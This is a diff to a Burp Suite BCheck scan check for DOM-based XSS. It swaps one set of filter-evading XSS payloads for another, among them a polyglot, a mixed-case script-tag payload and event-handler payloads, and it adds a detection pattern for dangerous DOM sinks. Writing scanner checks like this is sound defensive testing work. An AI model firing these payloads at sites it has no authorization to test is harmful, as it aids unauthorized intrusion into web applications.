@@ -5,17 +5,18 @@ metadata:
     author: "BCheck Arsenal"
     tags: "xss", "dom", "waf-bypass"
 
+run for each:
+    payload = "javascript:alert(document.domain)",
+        "'-alert(1)-'",
+        "</sCrIpT><sCrIpT>alert(1)</sCrIpT>",
+        "<img src=x onerror=alert(1)>",
+        "<svg onload=alert(1)>"
+
 given insertion point then
     send payload:
-        replacing: "{insertion_point}"
-        following replacements:
-            - "jaVaScRiPt:/*-/*\x27/*\"/*\x60/*<sVg/*/oNlOaD=alert()//>'"
-            - "${alert(document.domain)}"
-            - "'-alert(1)-'"
-            - "</sCrIpT><sCrIpT>alert(1)</sCrIpT>"
-            - "\";window['al'+'ert'](1);//"
+        replacing: {payload}
 
-    if {check.response} matches "(innerHTML|document\.write|eval\(|\.innerHTML|outerHTML|insertAdjacentHTML)" then
+    if {latest.response.body} matches "(innerHTML|document.write|eval[(]|outerHTML|insertAdjacentHTML)" then
         report issue:
             severity: medium
             confidence: tentative
